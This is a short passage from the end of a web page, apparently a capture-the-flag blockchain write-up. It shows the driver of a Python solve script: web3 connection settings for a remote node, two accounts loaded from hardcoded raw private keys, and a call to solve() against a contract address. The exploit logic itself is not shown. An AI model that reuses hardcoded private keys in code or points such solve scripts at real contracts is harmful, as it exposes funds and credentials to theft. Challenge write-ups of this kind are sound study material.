+ip = <span class="hljs-string">&#x27;47.243.235.111&#x27;</span>
+Mport = <span class="hljs-number">20000</span>
+Fport = <span class="hljs-number">8080</span>
+Gport = <span class="hljs-number">8545</span>
+
+web3 = Web3(Web3.HTTPProvider(<span class="hljs-string">f&#x27;http://<span class="hljs-subst">{ip}</span>:<span class="hljs-subst">{Gport}</span>&#x27;</span>,request_kwargs={<span class="hljs-string">&#x27;timeout&#x27;</span>:<span class="hljs-number">60</span>}))
+
+accountA = Account.from_key(<span class="hljs-string">b&#x27;~\xf6\xd8\xef\x14@\xa9\xd6\x13\x98`\xbc\x9do\xf1\x14T\x96\xc2wO}O\xee\xc2&amp;\xf5\xb4\xcb\x96\x07\xed&#x27;</span>)
+accountB = Account.from_key(<span class="hljs-string">b&#x27;\xb1t\x05 p\x1a\xd4\x08&amp;U7\x14\x83\x89\xdeJ/\xf4\x9b\x17\xd0\x8cz!\xd2&quot;\xe4\xdb\x16\xa9(:&#x27;</span>)
+<span class="hljs-comment">#accountA = createAccount()</span>
+<span class="hljs-comment">#accountB = createAccount()</span>
+
+solve(accountA,accountB,<span class="hljs-string">&#x27;0x7265141788cdB6821148e0141B6467631E40d9fc&#x27;</span>)</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
